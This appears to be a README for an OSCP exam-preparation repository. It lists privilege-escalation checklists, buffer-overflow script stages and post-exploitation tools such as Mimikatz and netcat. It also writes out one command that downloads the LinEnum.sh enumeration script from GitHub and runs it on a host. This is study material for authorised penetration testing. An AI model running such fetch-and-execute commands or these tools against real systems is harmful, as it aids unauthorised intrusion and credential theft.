# All about OSCP

----

#### Custom checklists

- Linux privilege escalation
- Windows privilege escalation
- Windows post exploitation
- Windows 32 bit stack buffer overflow

#### Windows 32 bit stack buffer overflow

*Example scripts that are highly and easily customizable*

- Skeleton script
- Fuzzer
- Overflow EIP
- Sending unique pattern
- Sending bad characters
- Full script

#### Windows post exploitation

- Compiled Mimikatz32.exe
- Compiled Mimikatz64.exe
- Sherlock.ps1
- Priv checker (.exe/.py)
- Compiled nc/nc64

#### Linux post exploitation

- Linenum.sh
- linuxprivchecker.py
- unix-priv-checker.sh

#### Stupid one liners that saved me some time

- Automate LinEnum.sh: download > chmod > run > output to file

```
wget https://raw.githubusercontent.com/Arken2/Everything-OSCP/master/Linux%20Post%20exploitation/LinEnum.sh ; chmod +x LinEnum.sh ; ./LinEnum.sh > LinEnum-Output.txt
```
